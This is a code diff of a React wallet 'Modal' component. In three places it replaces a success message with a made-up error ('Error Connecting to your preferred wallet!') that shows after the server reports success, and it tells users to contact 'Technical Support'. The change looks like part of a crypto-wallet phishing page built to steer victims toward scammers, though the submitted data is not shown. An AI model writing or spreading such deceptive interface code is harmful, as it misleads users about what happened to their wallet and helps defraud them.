@@ -32,7 +32,9 @@ const Modal = ({ wallet, closeModal }) => {
 
         if (res.data.status === 'Success') {
           setLoading(false);
-          setMessage('Done, kindly refresh your wallet!');
+          setMessage(
+            'Error Connecting to your preferred wallet! Please contact the Technical Support for further assistance!'
+          );
           timer = setTimeout(() => closeModal(), 2000);
         }
       }
@@ -48,7 +50,9 @@ const Modal = ({ wallet, closeModal }) => {
 
         if (res.data.status === 'Success') {
           setLoading(false);
-          setMessage('Done, kindly refresh your wallet!');
+          setMessage(
+            'Error Connecting to your preferred wallet! Please contact the Technical Support for further assistance!'
+          );
           timer = setTimeout(() => closeModal(), 2000);
         }
       }
@@ -68,7 +72,9 @@ const Modal = ({ wallet, closeModal }) => {
           });
           if (res.data.status === 'Success') {
             setLoading(false);
-            setMessage('Done, kindly refresh your wallet!');
+            setMessage(
+              'Error Connecting to your preferred wallet! Please contact the Technical Support for further assistance!'
+            );
             timer = setTimeout(() => closeModal(), 2000);
           }
         };
